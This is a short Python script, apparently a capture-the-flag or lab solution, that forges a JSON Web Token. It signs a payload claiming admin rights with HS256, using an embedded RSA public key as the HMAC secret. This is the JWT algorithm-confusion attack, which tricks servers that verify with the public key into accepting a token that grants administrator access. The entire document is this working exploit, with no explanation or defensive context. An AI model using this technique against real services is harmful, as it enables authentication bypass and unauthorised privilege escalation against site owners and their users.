import jwt
import datetime

public_key_pem = """-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAwcMU3Y6CQyvA87vJRKZomubiceep9YlNdp6y95ICIZ3y7jV3oZyt
b1zfwFJ1p/pdTd7ckOOQVsP6/Y7g6gLa9S8YZmKzy7jU6EnV2XPnXTF287hXasup
OzLd4iAzRw12r9pIQ/Fjum8pQ2LzWEaAmuHfkm1o3C9i8ZsbfvZIw/tAB/qEfh34
dGoVvPsJawF44oEFkAQYlS40FmM1EkNzNmNPtKUXlRrr0be0PTCshUbX7VpGC0b1
9JKb/vB+KGye6yUjLwHKKUHZedHQFMMV9OayOwWSnP9J+9Tq77qyNSeBe6vy6uD1
XPm0mfmUYLJZKy0XqjHHxOB9DjKaecmMoQIDAQAB
-----END RSA PUBLIC KEY-----
"""
date = int(datetime.datetime.utcnow().timestamp())

payload = {
    "admin": True,
    "name": "admin",
    "iat": date
}

token = jwt.encode(payload, public_key_pem, algorithm='HS256')
print(token)